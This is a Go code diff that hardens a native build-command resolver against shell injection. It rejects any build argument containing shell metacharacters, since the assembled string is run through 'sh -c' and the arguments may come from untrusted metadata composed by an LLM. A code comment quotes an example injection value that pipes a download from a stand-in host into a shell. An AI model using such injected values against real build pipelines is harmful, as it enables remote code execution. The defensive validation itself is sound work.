@@ -220,6 +220,16 @@ func readAndroidLaunchInfo(apkPath string) (pkg, activity string) {
 // resolveNativeBuildCommand handles the two new BuildPlatform constants this
 // file introduces. Called from resolveBuildCommand in builds.go via fallthrough.
 func resolveNativeBuildCommand(platform BuildPlatform, workDir string, extraArgs []string) (command string, artifactPatterns []string, ok bool) {
+	// The resolved command is later run through `sh -c`, and extraArgs (build
+	// scheme/flavor/task, possibly composed from untrusted project metadata by
+	// an LLM) is spliced into that string. Refuse any element carrying shell
+	// metacharacters so `{"scheme":"x; curl evil|sh"}` cannot execute — legit
+	// build args are plain identifiers/flags (assembleRelease, --flavor=prod).
+	for _, a := range extraArgs {
+		if strings.ContainsAny(a, ";&|<>$`\n\r(){}!*?\\\"'") {
+			return "", nil, false
+		}
+	}
 	extra := strings.Join(extraArgs, " ")
 	if extra != "" {
 		extra = " " + extra
